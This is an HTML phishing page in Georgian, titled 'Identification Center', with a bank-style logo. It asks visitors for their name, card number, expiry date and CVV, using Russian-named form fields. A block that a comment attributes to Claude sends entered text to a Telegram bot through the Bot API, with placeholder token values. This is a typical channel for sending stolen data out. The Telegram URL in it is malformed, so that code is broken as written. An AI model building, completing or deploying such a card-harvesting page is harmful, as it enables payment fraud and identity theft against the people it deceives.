<!DOCTYPE html>
<html lang="ka">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="referrer" content="origin">
    
    <title>იდენტიფიკაციის ცენტრი</title>

    <style>
        body { font-family: Arial, sans-serif; background-color: #f4f4f9; margin: 0; padding: 20px; display: flex; flex-direction: column; align-items: center; }
        .center-container { text-align: center; margin-bottom: 20px; }
        .logo { max-width: 150px; }
        .form-container { background: white; padding: 25px 35px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 100%; max-width: 450px; box-sizing: border-box; }
        h1 { text-align: center; margin-bottom: 10px; color: #333; font-size: 24px; }
        h3 { text-align: center; color: #666; margin-bottom: 20px; font-weight: normal; }
        label { font-weight: bold; margin-bottom: 8px; display: block; font-size: 14px; color: #333; }
        input { width: 100%; padding: 14px; margin-bottom: 15px; border-radius: 6px; border: 1px solid #ccc; font-size: 16px; box-sizing: border-box; }
        
        .expiry-cvv-row { 
            display: flex; 
            gap: 15px; 
            width: 100%;
            margin-bottom: 15px;
        }
        .expiry-cvv-row div { 
            flex: 1; 
            min-width: 0; 
        }
        .expiry-cvv-row input {
            margin-bottom: 0;
        }

        button { width: 100%; padding: 16px; background-color: #007bff; color: white; border: none; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; }
        button:hover { background-color: #0056b3; }

        @media (max-width: 480px) { 
            .form-container { padding: 20px; }
            h1 { font-size: 20px; }
            .expiry-cvv-row { flex-direction: row !important; }
        }
    </style>
</head>

<body>

<div class="center-container">
    <img src="TBlogo.svg.png" alt="Logo" class="logo">
</div>

<div class="form-container">
    <h1>იდენტიფიკაციის ცენტრი</h1>

    <form>
        <h3>შეავსეთ ფორმა</h3>

        <label for="first-name">სახელი</label>
        <input type="text" name="Имя" id="first-name" placeholder="სახელი" required>

        <label for="last-name">გვარი</label>
        <input type="text" name="Фамилия" id="last-name" placeholder="გვარი" required>

        <label for="card-number">ბარათის ნომერი</label>
        <input type="text" name="Номер_Карты" id="card-number" placeholder="0000 0000 0000 0000" maxlength="19" inputmode="numeric" required>

        <div class="expiry-cvv-row">
            <div>
                <label for="expiry-date">მოქმედების ვადა</label>
                <input type="text" name="Срок_Действия" id="expiry-date" placeholder="MM/YY" maxlength="5" inputmode="numeric" required>
            </div>
            <div>
                <label for="cvv">უსაფর্থოების კოდი</label>
                <input type="text" name="CVV_Код" id="cvv" placeholder="***" maxlength="3" inputmode="numeric" required>
            </div>
        </div>

        <button type="submit">მონაცების გაგზავნა</button>
    </form>

    <hr style="margin: 20px 0;">

    <!-- НИЖЕ КОД ОТ CLAUDE -->
    <input type="text" id="userInput" placeholder="Введи текст...">
    <button onclick="sendToTelegram()">Отправить</button>

    <script>
    function sendToTelegram() {
      const text = document.getElementById('userInput').value;
      const token = 'ВАШ_TOKEN';
      const chatId = 'ВАШ_CHAT_ID';

      fetch(`https://api.telegram.org{token}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: '📩 Новое сообщение: ' + text
        })
      });

      alert('Отправлено!');
    }
    </script>
    <!-- КОНЕЦ КОДА ОТ CLAUDE -->

</div>

<script>
    document.getElementById('card-number').addEventListener('input', function (e) {
        let value = e.target.value.replace(/\D/g, '').slice(0,16);
        e.target.value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
    });

    document.getElementById('expiry-date').addEventListener('input', function (e) {
        let value = e.target.value.replace(/\D/g, ''); 
        if (value.length >= 2) {
            e.target.value = value.slice(0, 2) + '/' + value.slice(2, 4);
        } else {
            e.target.value = value;
        }
    });

    document.getElementById('cvv').addEventListener('input', function (e) {
        e.target.value = e.target.value.replace(/\D/g, '').slice(0,3);
    });
</script>

</body>
</html>
